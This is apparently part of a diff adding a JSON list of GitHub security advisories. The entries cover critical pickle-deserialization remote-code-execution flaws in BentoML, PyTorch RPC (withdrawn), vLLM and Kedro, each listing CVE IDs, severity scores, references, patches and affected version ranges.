+      "https://github.com/advisories/GHSA-33xw-247w-6hmc"
+    ],
+    "patch_urls": [
+      "https://github.com/bentoml/BentoML/commit/b35f4f4fcc53a8c3fe8ed9c18a013fe0a728e194"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "bentoml",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 1.3.4, < 1.4.3"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-4vmg-rw8f-92f9",
+    "cve_id": "CVE-2024-7804",
+    "summary": "Withdrawn Advisory: PyTorch deserialization vulnerability",
+    "description": "## Withdrawn Advisory\nThis advisory has been withdrawn because it describes known functionality of PyTorch. This link is maintained to preserve external references.\n\n## Original Description\nA deserialization vulnerability exists in the Pytorch RPC framework (torch.distributed.rpc) in pytorch/pytorch versions <=2.3.1. The vulnerability arises from the lack of security verification during the deserialization process of PythonUDF objects in pytorch/torch/distributed/rpc/internal.py. This flaw allows an attacker to execute arbitrary code remotely by sending a malicious serialized PythonUDF object, leading to remote code execution (RCE) on the master node.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-03-20T12:32:46Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-7804",
+      "https://huntr.com/bounties/0e870eeb-f924-4054-8fac-d926b1fb7259",
+      "https://github.com/pytorch/pytorch/blob/27a14405d3b996d572ba18339410e29ec005c775/torch/distributed/rpc/internal.py#L162",
+      "https://github.com/advisories/GHSA-4vmg-rw8f-92f9"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "torch",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 2.3.1"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-5vqr-wprc-cpp7",
+    "cve_id": "CVE-2024-11041",
+    "summary": "vLLM Deserialization of Untrusted Data vulnerability",
+    "description": "vllm-project vllm version v0.6.2 contains a vulnerability in the MessageQueue.dequeue() API function. The function uses pickle.loads to parse received sockets directly, leading to a remote code execution vulnerability. An attacker can exploit this by sending a malicious payload to the MessageQueue, causing the victim's machine to execute arbitrary code.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-03-20T12:32:41Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-11041",
+      "https://huntr.com/bounties/00136195-11e0-4ad0-98d5-72db066e867f",
+      "https://github.com/vllm-project/vllm/blob/7193774b1ff8603ad5bf4598e5efba0d9a39b436/vllm/distributed/device_communicators/shm_broadcast.py#L441-L443",
+      "https://github.com/advisories/GHSA-5vqr-wprc-cpp7"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "vllm",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 0.6.2"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-747f-ww56-4q4h",
+    "cve_id": "CVE-2024-9701",
+    "summary": "Kedro deserialization vulnerability",
+    "description": "A Remote Code Execution (RCE) vulnerability has been identified in the Kedro ShelveStore class (version 0.19.8). This vulnerability allows an attacker to execute arbitrary Python code via deserialization of malicious payloads, potentially leading to a full system compromise. The ShelveStore class uses Python's shelve module to manage session data, which relies on pickle for serialization. Crafting a malicious payload and storing it in the shelve file can lead to RCE when the payload is deserialized.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-03-20T12:32:51Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-9701",
+      "https://huntr.com/bounties/96c77fef-93b2-4d4d-8cbe-57a718d8eea5",
+      "https://github.com/kedro-org/kedro/commit/66e5e074b2789469550370f370c8b486f638d975",
+      "https://github.com/advisories/GHSA-747f-ww56-4q4h"
+    ],
+    "patch_urls": [
+      "https://github.com/kedro-org/kedro/commit/66e5e074b2789469550370f370c8b486f638d975"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "kedro",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 0.19.9"
+      }
+    ]
+  }
+]
